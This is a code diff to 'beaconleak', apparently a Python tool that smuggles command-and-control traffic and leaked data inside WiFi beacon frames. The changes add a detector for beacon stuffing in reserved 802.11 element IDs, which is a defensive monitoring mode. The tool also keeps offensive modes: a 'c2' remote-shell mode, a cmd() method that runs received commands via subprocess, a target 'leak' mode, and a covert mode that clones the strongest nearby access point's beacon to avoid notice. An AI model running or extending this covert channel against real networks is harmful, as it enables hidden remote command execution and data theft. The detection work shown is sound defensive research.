@@ -38,13 +38,16 @@ class beaconleak():
         )
         self.box = nacl.secret.SecretBox(self.key)
         self.debug = kwargs.get('debug')
+        # IEEE Std 802.11™-2016. Table 9-77, Element IDs. p.784-790
+        self.reserved = [2, 8, 9] + [*range(17,32)] + [47, 49, 128, 129] + [*range(133, 137)] + [149, 150, 155, 156, 173, 176] + [*range(178, 181)] + [203] + [*range(207,221)] + [*range(222, 255)]
+        self.detected = 0
 
     def cmd(self, cmd):
         args = shlex.split(cmd)
         result = subprocess.check_output(args)
         return result
 
-    def c2c(self):
+    def c2(self):
         iface = self.iface
         print("[*] Using interface %s, use Ctrl+C to exit" % iface)
         while True:
@@ -151,16 +154,20 @@ class beaconleak():
                 # covert case here
                 pass
 
-    def sniff(self):
+    def sniff(self, pcap=False):
         iface = self.iface
-        if self.mode == "sniff":
-            try:
+        try:
+            if self.mode == "sniff":
                 sniff(iface=iface, prn=self.magic)
-            except OSError as e:
+            elif self.mode == "mon":
+                if pcap:
+                    print("[*] Starting offline capture analysis")
+                    sniff(offline=pcap, prn=self.detect)
+                else:
+                    print("[*] Starting live monitoring mode")
+                    sniff(iface=iface, prn=self.detect)
+        except OSError as e:
                 print("[e] interface {} not found, maybe you meant {}mon?".format(iface,iface))
-        elif self.mode == "mon":
-            sniff(iface=iface, prn=self.monitor)
-            
 
     def clone(self, packet):
         if packet.haslayer(Dot11Beacon):
@@ -176,7 +183,7 @@ class beaconleak():
         print("[*] Covert mode enabled:")
         # sniff frames around me
         print("\t[i] probing for surrounding beacons...")
-        sniff(iface=self.iface, prn=self.clone, count=257)
+        sniff(iface=self.iface, prn=self.clone, count=20, timeout=10)
         # choose noisier one
         print("\t[i] checking results:")
         check = -100
@@ -191,14 +198,23 @@ class beaconleak():
         # imitate it
         packet = best.pop()
         print("\t[i] using {}({} dBm)".format(str(packet.info), check))
+        if self.debug:
+            print("[d] packet:\n{}".format(packet.command()))
         return packet
 
     # this is for the blue teamers
-    def monitor(self, packet):
-        beacons = []
-        if packet.type == 0 and packet.subtype == 8:
-            if packet.info not in beacons:
-                beacons.append(packet.info)
+    def detect(self, packet):
+        if packet.haslayer(Dot11Elt):
+            elements = packet.getlayer(Dot11Elt)
+            #if self.debug:
+            #    print(packet.command())
+            while elements:
+                if elements.ID in self.reserved:
+                    print("[!] BEACON STUFFING DETECTED (SSID:{} Reserved Element {})".format(packet[Dot11Beacon].info.decode('utf-8'), elements.ID))
+                    self.detected += 1
+                    if self.debug:
+                        print("[{}] Data: {}".format(self.detected, elements.info.hex()))
+                elements = elements.payload.getlayer(Dot11Elt)
 
 
 if __name__ == '__main__':
@@ -209,23 +225,23 @@ if __name__ == '__main__':
     |___|___|__,|___|___|_|_|_____|___|__,|_,_|
                                by cjcase [v0.7]\n
     """
-    parse = argparse.ArgumentParser(add_help=True)
-    modes = parse.add_argument_group('operation modes')
+    parse = argparse.ArgumentParser(add_help=True, formatter_class=argparse.RawTextHelpFormatter, description=banner)
+    modes = parse.add_argument_group('modes')
     mutex = modes.add_mutually_exclusive_group(required=True)
     mutex.add_argument(
         '--leak', # this mode is being worked on, defaults to sniff
-        help='Run tool in leak mode. (victim)',
+        help='(target) Leak data mode.',
         action='store_true'
     )
-    mutex.add_argument('--sniff', help='Sniff incoming C2 beacons.', action='store_true')
+    mutex.add_argument('--sniff', help='() Sniff incoming C2 beacons.', action='store_true')
     mutex.add_argument(
         '--mon',
-        help='Check surroundings for possible attacks',
+        help='(detect) Check surroundings for possible attacks',
         action='store_true'
     )
     mutex.add_argument(
-        '--c2c',
-        help='Command & control! all hail the demo gods.',
+        '--c2',
+        help='(attack) Command & control, remote shell',
         action='store_true'
     )
     optional_arguments = {
@@ -238,20 +254,33 @@ if __name__ == '__main__':
     # extra options
     parse.add_argument('--ssid', help='Emulated station WiFi name')
     parse.add_argument('--bssid', help='Emulated station MAC address')
+    parse.add_argument('--psk', help='Custom encryption passphrase')
+    parse.add_argument('--pcap', help='pcap file for offline beacon analysis')
 
-    parse.add_argument('iface', help='Wireless interface.')
+    # Logging options
+    parse.add_argument('--loglevel', help='log level, lowest is critical')
+
+    parse.add_argument('iface', help='Wireless interface in monitor mode')
     args = parse.parse_args()
 
-    # bl = beaconleak('unused', args.iface)
+    # covert mode
+    packet = None
+    if args.covert:
+        bl = beaconleak('covert', args.iface, debug=args.debug)
+        print(banner)
+        packet = bl.covert()        
+
     if args.leak:
         bl = beaconleak('leak', args.iface, debug=args.debug)
         bl.sniff()
     elif args.sniff:
         bl = beaconleak('sniff', args.iface, debug=args.debug)
         bl.sniff()
-    elif args.c2c:
-        bl = beaconleak('c2c', args.iface, debug=args.debug)
-        bl.c2c()
+    elif args.c2:
+        bl = beaconleak('c2', args.iface, debug=args.debug)
+        print(banner)
+        bl.c2()
     elif args.mon:
         bl = beaconleak('mon', args.iface, debug=args.debug)
-        bl.sniff()
+        print(banner)
+        bl.sniff(pcap=args.pcap)
